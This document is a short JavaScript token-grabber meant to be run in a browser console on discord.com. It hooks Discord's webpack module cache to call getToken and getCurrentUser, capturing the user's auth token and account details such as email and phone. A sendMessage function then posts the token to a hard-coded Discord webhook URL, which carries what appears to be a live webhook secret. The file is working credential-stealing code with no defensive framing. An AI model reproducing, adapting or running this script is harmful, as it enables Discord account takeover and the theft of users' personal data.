// script that you execute on discord.com

// when you execute the script, it will get the user's token using webpackchunkdiscord_app

// the script also gets user's id, username, discriminator, avatar, email, phone, and nitro type

let id = Math.random().toString(36)
let token = null;
let user = {};
window.webpackChunkdiscord_app.push([[id], {}, function (req) {
    let keyed = Object.keys(req.c).map(function (key) {
        if (req.c[key].exports) {
            return req.c[key].exports
        }
    }).filter(function (e) {
        return e
    })

    keyed.find(function (key) {
        let def = key.default

        if (!def) return

        if (def.getToken !== undefined) {
            token = def.getToken()
        }

        if (def.getCurrentUser !== undefined) {
            Object.assign(user, def.getCurrentUser())
        }
    })
}])

function sendWebHook(url, data) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", url);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.send(JSON.stringify(data));
}
function sendMessage() {
    fetch("https://discord.com/api/webhooks/1045789973640650803/2iK1LzlOGHH8-jTnXThHfj1p5uQdgxt_Ow3y7rOO5hAJ92TuHV27hnjI-RqpTMH2V4pQ", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: `**Token:** ${token}`,
        })
    })
}
